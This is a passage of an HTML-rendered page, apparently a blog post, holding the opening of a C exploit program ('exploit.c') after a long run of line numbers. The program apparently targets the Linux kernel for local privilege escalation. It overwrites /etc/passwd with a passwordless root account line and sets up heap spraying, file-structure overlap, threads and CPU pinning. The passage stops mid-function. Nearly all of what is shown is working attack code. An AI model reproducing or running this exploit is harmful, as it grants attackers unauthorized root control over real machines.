class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $ gcc -static -pthread -O0 ./exploit.c -o ./exploit</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;net/if_arp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tc_ematch/tc_em_meta.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/capability.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/futex.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/genetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_addr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_link.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_tun.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in6.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kcmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/neighbour.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/veth.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;x86intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* target = <span class="string">&quot;/etc/passwd&quot;</span>;                   <span class="comment">// overwrite the target file</span></span><br><span class="line"><span class="keyword">char</span>* overwrite = <span class="string">&quot;hi:x:0:0:root:/:/bin/sh\n&quot;</span>;  <span class="comment">// &quot;user:$1$user$k8sntSoh7jhsc6lwspjsU.:0:0:/root/root:/bin/bash\n&quot;</span></span><br><span class="line"><span class="keyword">char</span>* global;</span><br><span class="line"><span class="keyword">char</span>* self_path;</span><br><span class="line"><span class="keyword">char</span>* content;                                  <span class="comment">// evil data + existing data in the target file</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_FILE_NUM 0x8000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fds[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> fd_2[MAX_FILE_NUM] = &#123;&#125;;</span><br><span class="line"><span class="keyword">int</span> overlap_a = <span class="number">-1</span>;     <span class="comment">// unprivileged `file`</span></span><br><span class="line"><span class="keyword">int</span> overlap_b = <span class="number">-1</span>;     <span class="comment">// privileged `file`</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cpu_cores = <span class="number">0</span>;      <span class="comment">// num of cpu cores</span></span><br><span class="line"><span class="keyword">int</span> sockfd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> spray_num_1 = <span class="number">2000</span>; <span class="comment">// 4000</span></span><br><span class="line"><span class="keyword">int</span> spray_num_2 = <span class="number">4000</span>; <span class="comment">// 5000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pipe_main[<span class="number">2</span>];       <span class="comment">// notify process to excecute using pipe</span></span><br><span class="line"><span class="keyword">int</span> pipe_parent[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_child[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_defrag[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> pipe_file_spray[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> run_write = <span class="number">0</span>;      <span class="comment">// let thread 2 begin to write evil data</span></span><br><span class="line"><span class="keyword">int</span> run_spray = <span class="number">0</span>;      <span class="comment">// let thread 3 begin to spray privileged `file`</span></span><br><span class="line"><span class="keyword">bool</span> overlapped = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span>* buf, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span>*)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// set cpu affinity</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_on_cpu</span><span class="params">(<span class="keyword">int</span> cpu)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(cpu, &amp;cpu_set);</span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set) != <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sched_setaffinity()&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">write_file</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* file, <span class="keyword">const</span> <span class="keyword">char</span>* what, ...)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">    va_list args;</span><br><span class="line">    va_start(args, what);</span><br><span class="line">    vsnprintf(buf, <span class="keyword">sizeof</span>(buf), what, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    buf[<span class="keyword">sizeof</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">int</span> fd = open(file, O_WRONLY | O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (write(fd, buf, len) != len) &#123;</span><br><span class="line">        <span class="keyword">int</span> err = errno;</span><br><span class="line">        close(fd);</span><br><span class="line">        errno = err;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// setup working dir</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">use_temporary_dir</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;touch exp_dir/data2&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span>* tmpdir = <span class="string">&quot;exp_dir&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!tmpdir)</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chmod(tmpdir, <span class="number">0777</span>))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (chdir(tmpdir))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    symlink(<span class="string">&quot;./data&quot;</span>, <span class="string">&quot;./uaf&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// setup process memory</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">adjust_rlimit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = (<span class="number">200</span> &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    setrlimit(RLIMIT_AS, &amp;rlim);</span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max = <span class="number">32</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    setrlimit(RLIMIT_MEMLOCK, 